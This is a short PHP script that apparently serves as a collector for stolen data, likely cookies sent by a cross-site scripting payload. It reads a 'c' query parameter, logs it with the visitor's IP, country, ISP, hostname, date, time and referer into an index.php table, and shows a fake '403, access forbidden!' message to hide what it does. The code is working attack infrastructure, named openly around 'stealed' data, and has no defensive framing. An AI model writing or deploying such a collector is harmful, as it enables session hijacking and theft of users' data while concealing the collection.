<?php
	function addToStealed($file, $country, $ip, $isp, $host, $date, $heure, $provenance, $data)
	{
		$tmp		= file($file);
		$newPage	= '';
		while($ligneActuelle = array_shift($tmp))
		{
			//if(preg_match("#<!-- Breakpoint -->#",$ligneActuelle)) //si on rencontre le breakpoint
			if($ligneActuelle == "<!-- Breakpoint -->\n") //si on rencontre le breakpoint
			{
				$newPage .= "<tr><td>$country</td><td>$ip</td><td>$isp</td><td>$host</td><td>$date</td><td>$heure</td><td>$provenance</td><td>$data</td></tr>";
				$newPage .= "\n<!-- Breakpoint -->\n";
			}
			else
				$newPage .= $ligneActuelle;
		}
		
		$monfichier = fopen($file, 'w');
		fseek($monfichier, 0);
		fputs($monfichier, $newPage);
	 
		fclose($monfichier);
	}
	$country = geoip_country_code3_by_name($_SERVER['REMOTE_ADDR']);
	$isp = geoip_isp_by_name($_SERVER['REMOTE_ADDR']);
	$ip			= $_SERVER['REMOTE_ADDR'];
	$host		= gethostbyaddr($ip);
	$date		= date("m/d/Y");
	$heure		= date("H:i:s");
	$provenance	= (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
	if(isset($_GET['c']))	$data	= $_GET['c'];
	else 					$data	= 'No data';
	
	addToStealed("index.php", $country, $ip, $isp, $host, $date, $heure, $provenance, $data);
	echo "403, access forbidden!";
?>